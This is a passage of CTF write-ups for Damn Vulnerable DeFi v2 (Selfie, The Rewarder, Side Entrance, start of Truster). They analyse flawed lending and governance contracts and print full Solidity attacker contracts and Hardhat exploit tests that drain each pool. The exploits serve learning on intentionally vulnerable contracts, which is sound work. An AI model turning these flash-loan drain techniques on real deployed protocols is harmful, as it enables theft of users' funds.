&#123;</span><br><span class="line">        // Take snapshot when we receive tokens.</span><br><span class="line">        // This is for passing the _hasEnoughVotes requirement of this contract when</span><br><span class="line">        // getting balance aat last snapshopt</span><br><span class="line">        DVT.snapshot();</span><br><span class="line"></span><br><span class="line">        bytes memory data = abi.encodeWithSignature(&quot;drainAllFunds(address)&quot;, address(this));</span><br><span class="line"></span><br><span class="line">        // Use tokens to queue a new action</span><br><span class="line">        governance.queueAction(address(selfiePool), data, 0);</span><br><span class="line"></span><br><span class="line">        // Transfer tokens back to pool</span><br><span class="line">        DVT.transfer(address(selfiePool), _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack_2daysLater(uint actionId) external &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        governance.executeAction(actionId);</span><br><span class="line">        DVT.transfer(msg.sender, DVT.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>test</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Deploy evil contract</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">SelfieAttacker</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;SelfieAttacker&#x27;</span>, attacker)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">selfieAttackerContract</span> = <span class="keyword">await</span> <span class="title class_">SelfieAttacker</span>.<span class="title function_">deploy</span>(</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">governance</span>.<span class="property">address</span>,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">token</span>.<span class="property">address</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Log balances</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Before: POOL DVT BALANCE: &#x27;</span>, <span class="title class_">String</span>(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">balanceOf</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>)))</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Before: ATTACKER DVT BALANCE: &#x27;</span>, <span class="title class_">String</span>(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">balanceOf</span>(attacker.<span class="property">address</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make a flash loan. This will take snapshot, queue evil action and transfer DVT back to pool</span></span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">selfieAttackerContract</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">attack_flashloan</span>(<span class="variable constant_">TOKENS_IN_POOL</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Travel through time (2 days) in order to execute the queued action.</span></span><br><span class="line">    <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">send</span>(<span class="string">&#x27;evm_increaseTime&#x27;</span>, [<span class="number">2</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Execute the queued action. This will call the drainAllFunds() function of the pool contract and send them to our evil contract.</span></span><br><span class="line">    <span class="comment">// Retrieve all DVT from attacker contract to attacker address.</span></span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">selfieAttackerContract</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">attack_2daysLater</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Log balances</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;After: POOL DVT BALANCE: &#x27;</span>, <span class="title class_">String</span>(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">balanceOf</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>)))</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;After: ATTACKER DVT BALANCE: &#x27;</span>, <span class="title class_">String</span>(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">balanceOf</span>(attacker.<span class="property">address</span>)))</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 05.Damn Vulnerable DeFi v2 CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.The Rewarder</title>
      <link href="/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/05.The%20Rewarder/"/>
      <url>/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/05.The%20Rewarder/</url>
      
        <content type="html"><![CDATA[<h1 id="The-Rewarder"><a href="#The-Rewarder" class="headerlink" title="The Rewarder"></a>The Rewarder</h1><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><p>the whole business as the following picture:</p><p><img src="https://moe.photo/images/2023/02/24/TheRewardPool-16771693237012.png" alt></p><h3 id="test-file-analyse"><a href="#test-file-analyse" class="headerlink" title="test file analyse"></a>test file analyse</h3><p>the the-rewarder.challenge.js ‘s code translate to words: </p><blockquote><p><em>There’s a pool</em> <code>TheRewarderPool</code><em>offering rewards in tokens</em> <code>RewardToken</code><em>every 5 days for those who deposit their DVT tokens into it.</em><br><em>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!</em><br><em>You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.</em></p><p>in this level, u can pass the level by flashloan!</p></blockquote><h3 id="contract-analyse"><a href="#contract-analyse" class="headerlink" title="contract analyse"></a>contract analyse</h3><ul><li>RewardToken：it is a normal ERC20 token</li><li>AccountingToken：it is an ERC20 token. It is used with The RewarderPool to better managing and controling the rewards.</li><li>FlashLoanerPool：a flashloan pool, we can flashloan some money to do something bad</li><li>TheRewarderPool：deposit, withdraw, allocate AccToken and RewardToken. It is the core Contract.</li></ul><h3 id="business-analyse"><a href="#business-analyse" class="headerlink" title="business analyse"></a>business analyse</h3><p>From the picture I created, we can know the whole logic of this level:</p><ul><li>DVT is a nornal ERC20 token, while FlashLoanerPool privides us to flashloan</li><li>RewardToken is the stuff we need to get. It is allocated by the TheRewarderPool, while TheRewardPool allocates RewardToken by the scale of the AccoutingToken<ul><li>everyone deposits his DVT to RewarderPool will get AccountingToken</li><li>every 5 days, TheRewarderPool will give every participant some RewardToken:  <strong>one’s contribute AccToken / all AccToken</strong></li><li>in this formula and logic, the more u deposit, the more u get AccToken, the more u get RewardToken</li></ul></li><li>So we can flashloan a lot of DVT to deposit, we will get the whole RewardToken(100). Why it is 100 ? they four also deposts 100 DVT to the TheRewarderPool. This is the reason: we deposit 1 million tokens DVT(the whole DVT in flashloanPool). Due to our token balance and thus our share of the overall tokens in the reward pool being so high, the integer division results in all other accounts receiving 0 rewards.</li></ul><p>this is the receiveFlashLoan implementation, I have note the attack logic between the code.</p><p>The solution is the following:</p><ol><li>Wait 5 days and take a flash loan of DVT from the <code>FlashLoanerPool</code>,</li><li>Deposit to the <code>RewarderPool</code>,</li><li>Call <code>distributeRewards</code> to get <code>RewardToken</code>,</li><li>Withdraw DVT</li><li>Repay the loan.</li><li>Send <code>RewardToken</code> to the attacker</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function receiveFlashLoan(uint256 amount) external &#123;</span><br><span class="line">        // Approve and deposit DVT to get reward tokens</span><br><span class="line">        // Approves and deposits the same amount of DVT to TheRewarderPool.</span><br><span class="line">        DVT.approve(address(rewarderPool), amount);</span><br><span class="line">        rewarderPool.deposit(amount);</span><br><span class="line"></span><br><span class="line">        // Withdraw DVT and pay flash loan back</span><br><span class="line">        // Withdraws the deposited amount to pay back the flash loan.</span><br><span class="line">        rewarderPool.withdraw(amount);</span><br><span class="line">        DVT.transfer(address(flashPool), amount);</span><br><span class="line"></span><br><span class="line">        //The withdrawRewards() function transfers all the reward token balance of RewarderAttacker to our attacker address.</span><br><span class="line">        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>and in the test file, I have note the attack logic between the code.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">    <span class="comment">// Travel through time (5 days)</span></span><br><span class="line"><span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">send</span>(<span class="string">&#x27;evm_increaseTime&#x27;</span>, [<span class="number">5</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">// Deploy evil contract</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">RewarderAttacker</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;RewarderAttacker&#x27;</span>, attacker)</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">rewarderAttacker</span> = <span class="keyword">await</span> <span class="title class_">RewarderAttacker</span>.<span class="title function_">deploy</span>(</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">flashLoanPool</span>.<span class="property">address</span>,</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">rewarderPool</span>.<span class="property">address</span>,</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">liquidityToken</span>.<span class="property">address</span>,</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">rewardToken</span>.<span class="property">address</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line"><span class="string">&#x27;Attacker reward token balance before attack: &#x27;</span>,</span><br><span class="line"><span class="title class_">String</span>(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">rewardToken</span>.<span class="title function_">balanceOf</span>(attacker.<span class="property">address</span>))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attack</span></span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">rewarderAttacker</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">attack</span>(<span class="variable constant_">TOKENS_IN_LENDER_POOL</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line"><span class="string">&#x27;Attacker reward token balance after attack: &#x27;</span>,</span><br><span class="line"><span class="title class_">String</span>(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">rewardToken</span>.<span class="title function_">balanceOf</span>(attacker.<span class="property">address</span>))</span><br><span class="line">)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><ul><li>RewarderAttacker</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../the-rewarder/FlashLoanerPool.sol&quot;;</span><br><span class="line">import &quot;../the-rewarder/TheRewarderPool.sol&quot;;</span><br><span class="line">import &quot;../the-rewarder/RewardToken.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract RewarderAttacker &#123;</span><br><span class="line">    FlashLoanerPool immutable flashPool;</span><br><span class="line">    TheRewarderPool immutable rewarderPool;</span><br><span class="line">    DamnValuableToken immutable DVT;</span><br><span class="line">    RewardToken immutable rewardToken;</span><br><span class="line">    address immutable owner;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _flashPool,</span><br><span class="line">        address _rewarderPool,</span><br><span class="line">        address _dvt,</span><br><span class="line">        address _rewardToken</span><br><span class="line">    ) &#123;</span><br><span class="line">        flashPool = FlashLoanerPool(_flashPool);</span><br><span class="line">        rewarderPool = TheRewarderPool(_rewarderPool);</span><br><span class="line">        DVT = DamnValuableToken(_dvt);</span><br><span class="line">        rewardToken = RewardToken(_rewardToken);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 amount) external &#123;</span><br><span class="line">        require(owner == msg.sender);</span><br><span class="line">        flashPool.flashLoan(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function receiveFlashLoan(uint256 amount) external &#123;</span><br><span class="line">        // Approve and deposit DVT to get reward tokens</span><br><span class="line">        // Approves and deposits the same amount of DVT to TheRewarderPool.</span><br><span class="line">        DVT.approve(address(rewarderPool), amount);</span><br><span class="line">        rewarderPool.deposit(amount);</span><br><span class="line"></span><br><span class="line">        // Withdraw DVT and pay flash loan back</span><br><span class="line">        // Withdraws the deposited amount to pay back the flash loan.</span><br><span class="line">        rewarderPool.withdraw(amount);</span><br><span class="line">        DVT.transfer(address(flashPool), amount);</span><br><span class="line"></span><br><span class="line">        //The withdrawRewards() function transfers all the reward token balance of RewarderAttacker to our attacker address.</span><br><span class="line">        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>test</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">    <span class="comment">// Travel through time (5 days)</span></span><br><span class="line"><span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">send</span>(<span class="string">&#x27;evm_increaseTime&#x27;</span>, [<span class="number">5</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">// Deploy evil contract</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">RewarderAttacker</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;RewarderAttacker&#x27;</span>, attacker)</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">rewarderAttacker</span> = <span class="keyword">await</span> <span class="title class_">RewarderAttacker</span>.<span class="title function_">deploy</span>(</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">flashLoanPool</span>.<span class="property">address</span>,</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">rewarderPool</span>.<span class="property">address</span>,</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">liquidityToken</span>.<span class="property">address</span>,</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">rewardToken</span>.<span class="property">address</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line"><span class="string">&#x27;Attacker reward token balance before attack: &#x27;</span>,</span><br><span class="line"><span class="title class_">String</span>(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">rewardToken</span>.<span class="title function_">balanceOf</span>(attacker.<span class="property">address</span>))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Attack and withdraw</span></span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">rewarderAttacker</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">attack</span>(<span class="variable constant_">TOKENS_IN_LENDER_POOL</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line"><span class="string">&#x27;Attacker reward token balance after attack: &#x27;</span>,</span><br><span class="line"><span class="title class_">String</span>(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">rewardToken</span>.<span class="title function_">balanceOf</span>(attacker.<span class="property">address</span>))</span><br><span class="line">)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 05.Damn Vulnerable DeFi v2 CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.Side Entrance</title>
      <link href="/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/04.Side%20Entrance/"/>
      <url>/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/04.Side%20Entrance/</url>
      
        <content type="html"><![CDATA[<h1 id="Side-Entrance"><a href="#Side-Entrance" class="headerlink" title="Side Entrance"></a>Side Entrance</h1><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><p>Our goal is to decrease SideEntranceLenderPool’s balance to zero ETH and attacker gets ‘attackerInitialEthBalance’ ETH. So it is transfer the pool’s balance to attacker’s account.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">after</span>(<span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** SUCCESS CONDITIONS */</span></span><br><span class="line">        <span class="title function_">expect</span>(</span><br><span class="line">            <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>)</span><br><span class="line">        ).<span class="property">to</span>.<span class="property">be</span>.<span class="title function_">equal</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Not checking exactly how much is the final balance of the attacker,</span></span><br><span class="line">        <span class="comment">// because it&#x27;ll depend on how much gas the attacker spends in the attack</span></span><br><span class="line">        <span class="comment">// If there were no gas costs, it would be balance before attack + ETHER_IN_POOL</span></span><br><span class="line">        <span class="title function_">expect</span>(</span><br><span class="line">            <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(attacker.<span class="property">address</span>)</span><br><span class="line">        ).<span class="property">to</span>.<span class="property">be</span>.<span class="title function_">gt</span>(<span class="variable language_">this</span>.<span class="property">attackerInitialEthBalance</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>SideEntranceLenderPool has a mapping <code>balances</code>, it allows anyone to deposit and withdraw their liquidity. </p><p>There is a logical error in the following code: When calling flashloan(), SideEntranceLenderPool will only check whether its balance decrease or not. But if we flashLoan a lot of money, and then use it to deposit, the address(this).balances will not change! We can pass it. And because we have recorded mapping <code>balances</code>(by deposit()), we can withdraw it!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">balances[msg.sender] += msg.value;</span><br><span class="line"></span><br><span class="line">require(address(this).balance &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);        </span><br></pre></td></tr></table></figure><p>I think it is a logical error. Balance check should not be the contract’s balance while deposit() will change it. In order to correct it, maybe it could change contract balance check to the mapping <code>balances</code> check.</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><ul><li>SideEntranceAttacker</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../side-entrance/SideEntranceLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SideEntranceAttacker &#123;</span><br><span class="line"></span><br><span class="line">    SideEntranceLenderPool private immutable pool;</span><br><span class="line">    address payable attacker;</span><br><span class="line"></span><br><span class="line">    constructor (address poolAddress, address attackerAddress) &#123;</span><br><span class="line">        pool = SideEntranceLenderPool(poolAddress);</span><br><span class="line">        attacker = payable(attackerAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 amount) external &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable&#123;</span><br><span class="line">        pool.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive () external payable &#123;</span><br><span class="line">        attacker.transfer(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>test</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">SideEntranceAttackerFactory</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;SideEntranceAttacker&#x27;</span>, deployer);</span><br><span class="line">        <span class="keyword">const</span> attackerContract = <span class="keyword">await</span> <span class="title class_">SideEntranceAttackerFactory</span>.<span class="title function_">deploy</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>, attacker.<span class="property">address</span>);</span><br><span class="line">        <span class="keyword">await</span> attackerContract.<span class="title function_">connect</span>(attacker).<span class="title function_">attack</span>(<span class="variable constant_">ETHER_IN_POOL</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 05.Damn Vulnerable DeFi v2 CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.Truster</title>
      <link href="/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/03.Truster/"/>
      <url>/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/03.Truster/</url>
      
        <content type="html"><![CDATA[<h1 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h1><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>This challenge involves another flash loan contract offering loans for the DVT token. The goal is that stealing the money from pool  to drain money. And attacker gets TOKENS_IN_POOL ETH.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">after</span>(<span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** SUCCESS CONDITIONS */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Attacker has taken all tokens from the pool</span></span><br><span class="line">        <span class="title function_">expect</span>(</span><br><span class="line">            <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">balanceOf</span>(attacker.<span class="property">address</span>)</span><br><span class="line">        ).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="variable constant_">TOKENS_IN_POOL</span>);</span><br><span class="line">        <span class="title function_">expect</span>(</span><br><span class="line">            <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">balanceOf</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>)</span><br><span class="line">        ).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p> The TrusterLenderPool contract accepts a custom function to call and a payload as its argument. This allows us to call any contract function on the flash loan contract’s behalf which can be exploited. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(</span><br><span class="line">        uint256 borrowAmount,</span><br><span class="line">        address borrower,</span><br><span class="line">        address target,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    )</span><br><span class="line">        external</span><br><span class="line">        nonReentrant</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.transfer(borrower, borrowAmount);</span><br><span class="line">        target.functionCall(data);</span><br><span class="line"></span><br><span class="line">        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid 